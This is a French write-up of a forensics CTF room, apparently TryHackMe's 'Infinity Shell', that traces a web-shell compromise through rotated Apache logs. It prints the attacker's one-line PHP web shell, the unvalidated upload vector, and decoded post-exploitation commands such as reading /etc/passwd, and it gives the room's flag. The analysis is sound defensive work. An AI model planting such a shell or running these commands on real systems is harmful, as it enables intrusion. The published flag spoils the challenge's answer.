@@ -1,0 +1,183 @@
+# Infinity Shell — Write-up
+
+**Catégorie** : Forensics | **Plateforme** : TryHackMe | **Date** : avril 2026
+
+---
+
+## Contexte
+
+> *Cipher's legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps.*
+
+Les mots qui comptent : **web application**, **web shell**, **trace the attacker's footsteps**. Pas un CTF offensif  une investigation.
+
+---
+
+## Fausse piste
+
+Première réaction en arrivant sur la machine : `ls -la` dans le home, exploration des dossiers utilisateur, `.ssh`... réflexe pentest. Rien d'intéressant. 15 mn de perdu...oups...reconcentration...on souffle un coup et c'est parti !!!! 
+
+En relisant l'énoncé : web application, web shell, le scope est clair : serveur web, logs, webshell. Pas le home directory.
+
+---
+
+## Contexte système
+
+```bash
+whoami && uname -a && date
+```
+
+Ubuntu 24, AWS, heure UTC notée — base pour la timeline.
+
+Détail notable :
+
+```
+.bash_history -> /dev/null
+```
+
+L'historique bash est délibérément supprimé. Pas un réglage par défaut.
+
+---
+
+## Serveur web
+
+```bash
+ps aux | grep -E 'apache|nginx'
+```
+
+Rien. Le serveur web ne tourne plus. Par contre `mariadbd` est actif — base de données en vie.
+
+Direction `/var/www/` :
+
+```
+/html/ CMSsite-master/    index.html
+```
+
+Apache !!! 
+
+---
+
+## Logs
+
+```bash
+ls -la /var/log/apache2/
+```
+
+```
+access.log           → vide
+error.log            → vide
+other_vhosts_access.log → vide
+error.log.1          → contenu
+other_vhosts_access.log.1  → contenu
+```
+
+`access.log` et `error.log` effacés. Les fichiers rotatifs `.1` sont intacts, l'attaquant a nettoyé les logs actifs, pas les archives.
+
+### error.log.1
+
+Deux informations notables :
+
+```
+PHP Fatal error: system(): Argument #1 cannot be empty
+    in /var/www/html/CMSsite-master/img/images.php
+```
+
+Fichier PHP dans un dossier `/img/` qui appelle `system()` certainement le shell.
+
+```
+sh: 1: ifconfig: not found
+```
+
+Une commande a été exécutée. `ifconfig` n'a pas fonctionné (pas installé ?).
+
+### other_vhosts_access.log.1
+
+Le log complet de l'attaque. Premier élément frappant :  même IP, deux User-Agents différents :
+
+```
+09:36:47  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+09:40:20  Mozilla/5.0 (Linux; Android 6.0; Nexus 5)
+09:40:42  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+```
+
+Spoofing de User-Agent : test de comportement de l'application ou tentative de bypass.
+
+---
+
+## Le web shell
+
+```bash
+cat /var/www/html/CMSsite-master/img/images.php
+```
+
+```php
+<?php system(base64_decode($_GET['query'])); ?>
+```
+
+Une ligne. Exécution de commandes OS via paramètre GET, encodé en base64 , ce qui masque les commandes dans les logs bruts.
+
+Vecteur d'upload : `POST /CMSsite-master/admin/profile.php?section=not_cipher`, fonctionnalité de modification de profil admin sans validation du type de fichier.
+
+---
+
+## Timeline
+
+### Reconnaissance  09:36
+
+Navigation sur le site, découverte du CMS. Erreur 500 sur `/CMSsite-master/`, credentials DB incorrects, visible dans `error.log.1`.
+
+### Accès  09:40 à 09:47
+
+```
+09:40:20  Retour après redémarrage Apache
+09:40:42  Consultation register.php
+09:46:59  POST register.php → création de compte
+09:47:16  POST login.php → connexion
+09:47:17  Accès /admin/
+09:47:20  /admin/profile.php?section=not_cipher
+```
+
+### Upload du shell  09:47 à 09:50
+
+```
+09:47:51  POST profile.php → premier upload
+09:47:51  GET /img/images.php → 404 (mauvais chemin)
+09:48:28  GET /img/ → listing du dossier, confirmation du fichier
+09:50:32  GET /img/images.php → 500 (shell présent, query vide)
+```
+
+Plusieurs tentatives avant de trouver le bon chemin. La consultation du listing `/img/` confirme que le fichier est bien là.
+
+### Exécution — 09:50 à 09:51
+
+```bash
+echo "d2hvYW1pCg==" | base64 -d   # whoami
+echo "bHMK" | base64 -d            # ls
+echo "ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=" | base64 -d  # echo 'THM{...}'
+echo "aWZjb25maWcK" | base64 -d   # ifconfig → échoue
+echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d  # cat /etc/passwd
+echo "aWQK" | base64 -d            # id
+```
+
+Séquence classique post-exploitation : vérification du contexte, reconnaissance, énumération des utilisateurs, vérification des privilèges.
+
+---
+
+## IoC
+
+| Type | Valeur |
+|---|---|
+| IP attaquant | `10.11.93.143` |
+| Web shell | `/var/www/html/CMSsite-master/img/images.php` |
+| Vecteur | `POST /CMSsite-master/admin/profile.php?section=not_cipher` |
+| Première exécution | `06/Mar/2025 09:50:57 UTC` |
+| Flag | `THM{sup3r_34sy_w3bsh3ll}` |
+
+---
+
+## Ce que ça m'a appris
+
+La fausse piste du début était évitable avec une meilleure lecture de l'énoncé. "Web application" + "web shell" = logs et webroot en premier, pas le home directory.
+
+Les logs rotatifs sont souvent la seule source disponible après un incident, l'attaquant pense à effacer les logs actifs, rarement les archives. C'est une lacune opérationnelle courante.
+
+L'encodage base64 des commandes dans les paramètres GET est une technique simple mais efficace pour ralentir l'analyse des logs bruts. 
